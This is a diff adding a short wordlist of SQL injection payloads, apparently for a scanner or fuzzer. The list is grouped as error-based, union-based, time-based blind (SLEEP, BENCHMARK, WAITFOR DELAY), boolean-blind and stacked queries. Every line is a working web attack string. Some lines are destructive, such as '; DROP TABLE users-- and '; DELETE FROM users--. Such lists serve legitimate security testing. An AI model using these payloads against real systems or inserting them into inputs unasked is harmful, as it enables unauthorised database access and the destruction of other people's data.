@@ -1,0 +1,37 @@
+# SQL Injection Payloads
+# Error-based SQLi
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+' OR '1'='1' --
+admin' --
+' OR 'x'='x
+' OR 'a'='a
+
+# Union-based SQLi
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+
+# Time-based Blind SQLi (MySQL)
+' AND SLEEP(3)--
+' AND BENCHMARK(5000000,MD5('test'))--
+1' AND SLEEP(2)--
+'; WAITFOR DELAY '0:0:3'--
+1'; WAITFOR DELAY '0:0:2'--
+
+# Boolean-based Blind SQLi
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+
+# Stacked Queries
+'; DROP TABLE users--
+'; DELETE FROM users--
+
+# Comment variations
+'--
+'#
+';--
